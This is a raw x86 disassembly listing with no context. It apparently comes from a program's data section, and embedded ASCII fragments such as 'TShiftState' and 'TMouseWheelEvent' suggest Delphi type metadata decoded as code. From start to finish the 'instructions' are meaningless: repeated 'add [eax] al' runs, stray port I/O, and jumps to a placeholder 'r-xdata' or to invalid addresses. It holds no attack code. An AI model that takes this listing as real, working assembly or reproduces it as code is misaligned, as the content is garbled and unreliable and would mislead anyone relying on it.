add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
add [ edi + 0xe070043 ] ah
push esp
inc ebx
outsd
outsb
je r-xdata
inc ecx
add [ ebx + ebp * 8 ] dl
inc ebx
add [ edi + ebp * 8 - 0x143fffbf ] bl
inc ebx
add ah ch
out dx al
inc ecx
add [ eax - 0x2bffbe11 ] al
out dx eax
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
xor al 0xef
jae r-xdata
sub eax [ edx ]
mov al 0xe6
inc ebx
add [ esi ] cl
cmpsb [ esi ] [ edi ]
inc ebx
add [ eax + 0x5 ] cl
inc edx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ecx
add [ eax ] al
0xbfd00043 0x44
outsd
insb
jae r-xdata
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edi + ebp * 8 ] dh
add [ ebp - 0x588bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax + eax ] bl
add [ eax ] al
mov [ ecx + 0x33b40044 ] bh
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
sub_43a79e
inc ebx
add al bh
mov edi 0xc00c0044
inc esp
add ah ch
jmp r-xdata
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x43a80890
add [ ebx ] al
or al 0x54
add ah cl
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
inc eax
add [ ecx + ebp * 4 + 0x43 ] dh
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
call 0xffffffff85d7aa39
inc ecx
add [ eax - 0x1fffbe7c ] ch
add [ eax ] ebp
test eax 0x88900043
test eax 0xf010043
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xb0043a8 ] al
jae r-xdata
add al 0xa9
inc ebx
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + ebp * 4 ] al
inc ebx
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
dec ebp
popad
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
test al 0x43
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
jb r-xdata
dec ebp
outsd
jne r-xdata
push esp
rol [ eax + ebp * 4 + 0xa030043 ] 0x54
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
js r-xdata
push esp
call sub_44aab8
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
inc ebx
outsd
outsb
jae r-xdata
call 0xffffffffe813aa45
inc ebx
add [ ebp + eax * 4 - 0x7b57ffbf ] dl
inc ecx
add al ah
imul ebp [ esi + 0x74 ] 0x657a6953
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
inc eax
add ah al
xor eax [ eax ]
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
add bh bh
push esp
call sub_44aadb
add [ eax ] al
add al [ eax ]
test [ ecx + 0x100043 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43a98474
jb r-xdata
popad
jb r-xdata
jb r-xdata
jb r-xdata
enter 0x4033 0x0
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ esp + eax * 4 + 0x41 ] bh
add [ eax + ebp * 8 ] cl
inc ebx
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
popad
test al 0x43
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x43ab50c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
test eax 0x100043
imul ebp [ esi + 0x74 ] 0x43a9f073
add ah al
pop ecx
inc ecx
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
sbb al 0xaa
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jae r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0xa92cc08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
lea eax [ eax ]
shr [ eax + 0x9030043 ] 0x1
push esp
inc esp
jb r-xdata
insb
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax + eax ] dl
add bh bh
push esp
call sub_44aaff
inc ebx
outsd
insb
jae r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
jae r-xdata
insb
jae r-xdata
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
inc ebx
add al dl
out 0x43 eax
add eax 0x0
push esp
inc ebx
outsd
outsb
jae r-xdata
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
imul ebp [ esi + 0x64 ] 0x1
inc ebx
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
outsb
mov eax eax
sub al 0xa9
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax ] ch
test eax 0x61060043
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
outsb
add [ ecx ] al
add [ eax ] al
dec ebx
imul ebp [ esi + 0x64 ] 0x1
add [ ecx + edx ] al
inc eax
add [ eax + 0x10 ] ch
inc eax
add [ eax ] bh
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
call [ eax + ebp * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ ecx + ebp * 4 + 0x80043 ] al
add bh bh
push esp
call sub_44aa94
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ebp + 0x61 ] ecx
dec esp
popad
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx ] al
inc eax
add [ ecx + edx ] al
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
push edx
inc ecx
add [ eax + r-xdata ] dl
push 0x38004010
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x43a98474
imul esp [ gs : edi + 0x68 ] 0x43a98474
add [ eax + eax ] cl
add bh bh
add [ ecx ] al
add [ eax ] al
add [ eax + ebp * 4 + 0x43 ] al
add [ eax ] cl
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add al dl
test al 0x43
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
inc eax
add [ eax + edx ] bh
add al 0x11
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
inc esp
jb r-xdata
jbe r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
jbe r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x43a8 ] al
adc [ eax ] al
nop
les ebp [ ebx + eax * 2 + 0x540e0800 ]
inc esp
jb r-xdata
cmp al 0x10
outsb
je r-xdata
add al 0x11
inc eax
add [ eax ] bh
push edx
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x544bffc0 ] cl
inc ebx
add [ eax ] cl
or [ ebx + ecx * 2 + 0x65 ] edx
jns r-xdata
je r-xdata
jb r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
jb r-xdata
add al 0x11
inc eax
add [ eax ] ah
mov [ 0xffffffffad6c0043 ] eax
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
inc esp
or [ esi ] al
outsb
je r-xdata
je r-xdata
je r-xdata
or [ esi ] cl
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
je r-xdata
jb r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
jb r-xdata
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] eax
cmp al 0x10
inc ebx
add [ eax ] cl
or eax 0x646e4554
inc esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
and [ ebx - 0x5293ffbd ] ah
push ebx
outsb
add al 0x8
push es
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
outsb
je r-xdata
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
add [ ecx + edx ] al
inc eax
add [ eax ] ch
adc [ eax ] al
lea eax [ eax ]
cmp al 0xac
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0x4007261
adc [ eax ] eax
sub [ eax ] dl
inc eax
add [ ebp - 0x53c3ffc0 ] cl
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
add al 0x11
inc eax
add al al
movsd [ edi ] [ esi ]
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x51cfffc0 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add al cl
lodsd [ esi ]
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
adc [ eax ] eax
pop es
inc edx
outsd
outsd
insb
push ebx
add ecx [ eax ]
push es
add al 0x11
inc eax
add [ eax + ebp * 4 ] al
inc ebx
add [ eax ] bh
push edx
inc ecx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x52dbffc0 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
add al 0x11
inc eax
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
popad
outsb
add [ ecx + edx ] al
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
or [ esp + edx * 2 ] cl
inc esp
outsd
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
jbe r-xdata
jbe r-xdata
inc ebp
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
inc eax
add al al
movsd [ edi ] [ esi ]
inc ebx
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + 0x43a8 ] al
adc [ eax ] al
nop
shr [ esi + 0xc080043 ] 0x54
add al 0x11
outsb
je r-xdata
inc ebx
jpe r-xdata
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
sbb [ ebp + 0x43 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43b004c0 ] cl
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x4 ] si
adc [ eax ] eax
shl [ ebp - 0x5087ffbd ] 0x43
add [ eax ] cl
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
ja r-xdata
pop es
inc edx
outsd
outsd
insb
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x43b18cc0 ] cl
add [ eax ] cl
push ss
push esp
dec ebp
outsd
jne r-xdata
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] bl
mov ch 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
add al 0xb0
inc ebx
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add [ ecx + edx ] al
inc eax
add [ eax ] bl
mov ch 0x43
add al dh
mov esp 0x10000043
inc eax
add [ edi + ebp * 4 ] ch
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43b104c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx - 0x4d ] cl
inc ebx
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
add al 0x11
inc eax
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
clc
cmove eax [ eax ]
add al 0x31
inc eax
add [ eax ] ah
xor [ eax ] eax
mov ch ch
inc ebx
add al bl
add [ eax ] al
pushad
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
jo r-xdata
add [ eax + 0x67 ] ah
inc ecx
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
add [ esi ] cl
mov ch 0x43
add [ ecx + eax ] bl
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] bh
push edx
inc ecx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
je r-xdata
lea eax [ eax ]
movsb [ edi ] [ esi ]
mov dl 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
mov bl 0x43
add [ esi * 4 + 0x43 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec edx
mov bl 0x43
jbe r-xdata
outsb
je r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
pop es
dec ecx
outsb
je r-xdata
jbe r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] bh
push edx
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add [ edx + 0x12080043 ] dh
push esp
inc ebx
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] ecx
inc ebx
add [ eax ] cl
add ecx [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
push 0x65
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
adc [ eax ] cl
dec ebp
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx + 0x8 ] si
dec ebp
outsd
jne r-xdata
adc [ eax ] cl
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
sbb al 0x44
add al dl
adc [ eax + eax - 0x58 ] al
test [ ecx ] al
mov al [ 0xffffffff8000441c ]
add [ eax - 0x27ffbc13 ] cl
push eax
outsd
jae r-xdata
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
sub_43b3e4
inc esp
add [ edx + edx + 0x13c40044 ] dh
inc esp
add [ esp + edx ] dl
inc esp
add al dl
adc al [ eax + eax - 0x14 ]
adc eax [ eax + eax + 0x3c ]
adc al 0x44
add [ esp + edx + 0x157c0044 ] dl
inc esp
add ah dh
adc eax 0x16140044
inc esp
add [ esi + edx ] dh
inc esp
add [ esi + edx + 0x16cc0044 ] cl
inc esp
add [ edi + edx + 0x44 ] bh
add [ edi + edx + 0x17ac0044 ] ah
inc esp
add [ edi + edx + 0x18b40044 ] dh
inc esp
add ah ah
sbb [ eax + eax - 0x44 ] al
pop ss
inc esp
add [ eax + ebx + 0x1f300044 ] cl
inc esp
add [ eax ] cl
sbb [ eax + eax + 0x10 ] eax
sbb [ eax + eax + 0x28 ] eax
sbb [ eax + eax + 0x40 ] eax
sbb [ eax + eax + 0x58 ] eax
sbb al [ eax + eax + 0x6c ]
sbb [ eax + eax - 0x14 ] al
pop ss
inc esp
add [ eax ] dl
sbb [ eax + eax + 0x5c ] al
pop ds
inc esp
add [ eax - 0x5bffbbe6 ] bh
push ds
inc esp
add [ eax + 0x2 ] al
inc esp
add ah cl
test [ ebx ] sub_441120
nop
or al 0x44
add [ ecx + edx + 0x6a00044 ] cl
inc esp
add ah ah
add al 0x44
add [ eax + 0x4f80044 ] al
inc esp
add al al
hlt
sub_43b62a
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480b0009 ] al
insb
jo r-xdata
add [ eax ] dh
mov bh 0x43
add [ eax + eax ] ah
add [ eax ] al
sub [ edi + 0x33b40043 ] ah
inc eax
add al al
xor eax [ eax ]
les esi [ ebx ]
inc eax
add al cl
xor eax [ eax ]
mov esp 0x4004033
xor [ eax ] eax
and [ ecx ] dh
inc eax
add [ edi + ebp * 8 ] dh
jns r-xdata
inc ecx
add [ ebx + ebp * 8 ] dl
inc ebx
add [ edi + ebp * 8 - 0x143fffbf ] bl
inc ebx
add ah ch
inc esp
add [ eax - 0x11 ] ch
outsd
jb r-xdata
inc ecx
add ah al
and [ eax + eax + 0x68 ] al
out dx eax
inc eax
add [ ecx + esi ] al
push eax
push edx
inc ecx
add [ eax + 0x1 ] bl
add bh bh
sbb ch dh
inc ebx
add [ eax + 0x1c ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or ecx [ eax + 0x65 ]
insb
jo r-xdata
inc eax
add [ eax ] ah
xor [ eax ] eax
xor al 0xef
xor eax [ eax ]
add al 0x31
outsd
outsb
je r-xdata
add [ eax - 0x2bffbe11 ] al
out dx eax
inc ecx
add [ eax ] al
0xbfd00043 0x44
js r-xdata
je r-xdata
mov ah 0xb6
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
out dx al
inc ecx
in al dx
inc ebx
add al bh
mov edi 0x20e80044
inc esp
add ah ch
jmp r-xdata
inc ebx
